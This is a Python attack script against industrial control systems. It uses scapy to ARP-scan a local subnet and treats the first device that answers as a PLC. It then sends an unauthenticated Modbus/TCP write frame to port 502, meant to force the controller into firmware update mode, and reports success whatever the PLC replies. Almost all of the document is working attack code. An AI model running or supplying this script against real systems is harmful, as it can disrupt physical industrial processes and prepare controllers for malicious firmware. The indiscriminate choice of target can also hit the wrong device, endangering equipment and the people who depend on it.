import scapy.all as scapy
import socket
import time

# === Step 1: Scan the network to find the PLC's IP address ===
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network to locate PLC...")

    request = scapy.ARP(pdst=network_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answered, unanswered = scapy.srp(packet, timeout=2, verbose=False)

    for sent, received in answered:
        print(f"[*] Found device: {received.psrc} ({received.hwsrc})")
        # Here, add conditions to filter for the PLC if possible.
        # Example: Check MAC vendor or known IP range
        return received.psrc  # Return the first discovered IP

    print("[!] No PLC found.")
    return None


# === Step 2: Send a command to activate firmware update mode ===
def activate_firmware_update_mode(plc_ip, port=502):
    print(f"[*] Attempting to activate firmware update mode on PLC ({plc_ip})...")

    try:
        # Establish a TCP connection (assuming Modbus/TCP or custom protocol)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((plc_ip, port))

        # Construct a Modbus message or custom protocol message to enable firmware mode
        # This is an example Modbus command, actual command depends on PLC model
        firmware_update_command = b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x64\xFF\x00'  # Example command

        sock.send(firmware_update_command)
        response = sock.recv(1024)

        print(f"[*] Response from PLC: {response.hex()}")
        print("[+] Successfully triggered firmware update mode.")
        
        sock.close()

    except socket.timeout:
        print("[!] Connection timed out. PLC may be unreachable.")
    except Exception as e:
        print(f"[!] Error communicating with PLC: {e}")


# === Main Execution ===
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        activate_firmware_update_mode(plc_ip)
    else:
        print("[!] No PLC detected, quitting.")